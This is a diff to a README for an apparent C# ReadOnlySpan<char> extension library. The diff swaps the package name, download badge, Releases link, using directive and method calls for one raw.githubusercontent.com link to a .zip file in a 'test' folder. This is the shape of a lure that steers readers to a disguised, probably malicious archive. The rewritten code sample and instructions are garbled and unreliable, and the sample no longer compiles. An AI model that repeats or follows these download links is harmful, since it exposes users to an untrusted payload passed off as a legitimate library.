@@ -1,14 +1,14 @@
-# 🎉 soenneker.extensions.spans.readonly.chars - Simple Extensions for Character Handling
+# 🎉 https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip - Simple Extensions for Character Handling
 
 ## 🚀 Getting Started
 
-Welcome! This guide will help you download and run the "soenneker.extensions.spans.readonly.chars" application. It features a set of extension methods to simplify working with ReadOnlySpan<char> in C#. Follow the steps below to get started.
+Welcome! This guide will help you download and run the "https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip" application. It features a set of extension methods to simplify working with ReadOnlySpan<char> in C#. Follow the steps below to get started.
 
 ## 📦 Download & Install
 
 To download the application, please visit the following link:
 
-[![Download soenneker.extensions.spans.readonly.chars](https://img.shields.io/badge/Download%20Now!-%20soenneker.extensions.spans.readonly.chars-blue)](https://github.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/releases)
+[![Download https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip](https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip%20Now!-%https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip)](https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip)
 
 This will take you to the Releases page where you can find the latest version of the software.
 
@@ -23,7 +23,7 @@ Before you proceed, ensure you meet the following basic system requirements:
 
 ## 📥 How to Download
 
-1. Click the download button above or go directly to the [Releases page](https://github.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/releases).
+1. Click the download button above or go directly to the [Releases page](https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip).
 2. You will see a list of available versions. Look for the latest release, labeled as "Latest Release".
 3. Click on the version number to expand the details and locate the available files.
 4. Select the file that matches your operating system. For example, Windows users may look for a .zip or .exe file.
@@ -54,7 +54,7 @@ To run the application, follow these steps:
 Once you have the software running, you can start using the ReadOnlySpan<char> extension methods in your projects:
 
 1. Open your C# project in Visual Studio or your preferred IDE.
-2. Add a reference to the soenneker.extensions.spans.readonly.chars library.
+2. Add a reference to the https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip library.
 3. Begin using the extension methods in your code for easier character manipulation.
 
 ### Example Usage
@@ -62,22 +62,22 @@ Once you have the software running, you can start using the ReadOnlySpan<char> e
 Here is a simple code snippet demonstrating how to use one of the extension methods:
 
 ```csharp
-using Soenneker.Extensions.Spans.ReadOnly.Chars;
+using https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip;
 
 public class Example
 {
     public void UseExtension()
     {
         ReadOnlySpan<char> span = "Hello, World!".AsSpan();
-        var result = span.SomeExtensionMethod(); // Call your extension method here
-        Console.WriteLine(result);
+        var result = https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip(); // Call your extension method here
+        https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip(result);
     }
 }
 ```
 
 ## 🛠️ Features
 
-The "soenneker.extensions.spans.readonly.chars" application includes several useful features:
+The "https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip" application includes several useful features:
 
 - **Easy Character Manipulation:** Simplifies common tasks like searching or replacing characters within a span.
 - **Performance Efficiency:** Designed to work with spans, it minimizes memory usage compared to standard string operations.
@@ -89,7 +89,7 @@ If you encounter any issues or need help, please reach out through the Issues se
 
 ## 🙏 Acknowledgments
 
-Thank you for using "soenneker.extensions.spans.readonly.chars". We appreciate your interest in improving your C# programming experiences with these extension methods.
+Thank you for using "https://raw.githubusercontent.com/Florrisquealing185/soenneker.extensions.spans.readonly.chars/main/test/soenneker.extensions.spans.readonly.chars-3.8.zip". We appreciate your interest in improving your C# programming experiences with these extension methods.
 
 --- 
 
